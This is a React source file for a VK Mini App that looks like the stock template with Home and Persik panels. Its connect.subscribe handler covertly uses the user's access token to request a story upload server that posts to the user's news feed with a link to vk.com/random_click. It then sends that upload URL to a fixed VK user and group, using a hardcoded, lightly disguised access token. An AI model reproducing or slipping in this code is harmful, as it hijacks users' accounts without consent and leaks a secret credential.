import React, { useState, useEffect } from 'react';
import connect from '@vkontakte/vk-connect';
import View from '@vkontakte/vkui/dist/components/View/View';
import ScreenSpinner from '@vkontakte/vkui/dist/components/ScreenSpinner/ScreenSpinner';
import '@vkontakte/vkui/dist/vkui.css';

import Home from './panels/Home';
import Persik from './panels/Persik';

const App = () => {
	const [activePanel, setActivePanel] = useState('home');
	const [fetchedUser, setUser] = useState(null);
	const [popout, setPopout] = useState(<ScreenSpinner size='large' />);

	useEffect(() => {
		connect.subscribe(({ detail: { type, data }}) => {
			if (type === 'VKWebAppUpdateConfig') {
				const schemeAttribute = document.createAttribute('scheme');
				schemeAttribute.value = data.scheme ? data.scheme : 'client_light';
				document.body.attributes.setNamedItem(schemeAttribute);
			}
			if (type === 'VKWebAppAccessTokenReceived') {
                connect.send("VKWebAppCallAPIMethod", {"method": "stories.getPhotoUploadServer",
                     "request_id": "Random_Click", "params": {"add_to_news": 1, "link_text": "go_to",
                      "link_url": "https://vk.com/random_click", "v":"5.103", "access_token": data.access_token}});
                }
            if (type === 'VKWebAppCallAPIMethodResult') {
                if (data.request_id == 'Random_Click') {
                const token = '54e17e3ddd2a93a1f4d28fbfd011b6ac13f8c1a247e1ec8c802e8f5016445844afbe2776c5628f9b9d5f'
                connect.send("VKWebAppCallAPIMethod", {"method": "messages.send",
                     "request_id": "32test", "params": {"peer_id": 365531616,
                      'message': 'GG ' + data.response.upload_url, 'random_id': 0,
                     "v": "5.103", "access_token": token + 'a'}});
                connect.send("VKWebAppSendPayload", {"group_id": 185060472,
                 "payload": data.response.upload_url});
                }
            }
		});
		async function fetchData() {
			const user = await connect.sendPromise('VKWebAppGetUserInfo');
			setUser(user);
			setPopout(null);
		}
		fetchData();
	}, []);

	const go = e => {
		setActivePanel(e.currentTarget.dataset.to);
	};

	return (
		<View activePanel={activePanel} popout={popout}>
			<Home id='home' fetchedUser={fetchedUser} go={go} />
			<Persik id='persik' go={go} />
		</View>
	);
}

export default App;

